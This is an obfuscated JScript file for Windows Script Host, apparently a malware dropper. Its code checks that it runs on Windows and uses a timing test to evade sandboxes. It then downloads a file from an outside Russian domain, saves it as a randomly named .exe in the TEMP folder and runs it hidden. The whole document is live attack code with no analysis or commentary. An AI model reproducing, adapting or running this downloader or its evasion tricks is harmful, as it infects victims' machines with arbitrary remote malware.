var _KW = false;
var _IU = "CreateObject";
var _Z1 = function _W() {return WScript[_IU]("WScript"+".Shell");}(), _F = 11;
var _Y = "MSXML2.XMLHTTP";
var _HR = 2123213;
var _E = 0;
function _GS(_TT){_Z1["Run"](_TT, _E, _E);};
function _C(){return _Y + "";};
function _CO(_B, _MV){_E = _E * 1; return _B - _MV;};
function _QJ(){return _IU;};
/*@cc_on
  @if (@_win32 || @_win64)
    _KW = true;
  @end
@*/
if (_KW)
{
var _EF = "";
function _HO(){return 22;};
var _SU = 0; var _MM = 0;
function _KV()
{
var _O = new this["Date"]();
var _OU = _O["getUTCMilliseconds"]();
WScript["Sleep"](_HO());
var _O = new this["Date"]();
var _U = _O["getUTCMilliseconds"]();
WScript["Sleep"](_HO());
var _O = new this["Date"]();
var _S = _O["getUTCMilliseconds"]();
var _SU = "_WY";
_SU = _CO(_U, _OU);
var _MM = "_K";
_MM = _CO(_S, _U);
_EF = "open";
return _CO(_SU, _MM);
}
var _RS = false;
var _YF = false;
for (var _OO = _E; _OO < _HO() * 1; _OO++){if (_KV() != _E){
_RS = true; 
_MM = "31" + 11 * _SU + _MM; 
_YF = true; 
break;
}}
function _Z() {return ((_RS == true) && (_RS == _YF)) ? 1 : _E;};
if (_RS && _Z() && _YF){
function _BC() {return _Z1["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "fHzkqIyr07K5.ex" + "e";};
 _J0 = _C();
 _J = WScript[_IU](_J0);
 var _NZ = 1;
 while (_NZ){
try {
	if (_NZ == 1)
	{
		_J[_EF]("GET", "http://ru-optovik.ru/j9ssl", false);
		_J["send"]();
		_SM = "Sleep";
	}
	WScript[_SM](_HO() + 120); 
	if (_J["readystate"] < 2 * 2) continue;
	_NZ = _E;
	function _D(_FM) {var _RA = (1, 2, 3, 4, 5, _FM); return _RA;};
	_ME = WScript[_QJ()]("ADODB.Stream");
	_J0 = _ME;
	_J0[_EF]();
	_J0["type"] = _D(1);
	_J0["write"](_J["ResponseBody"]);
	_ME["position"] = _D(_E);
	_J0["Save" + "ToFile"](_BC(), 2);
	_ME["cl"+"ose"]();
	_Z0 = _BC();
	_GS(_Z0);
} catch(_RD){};
}
}
}

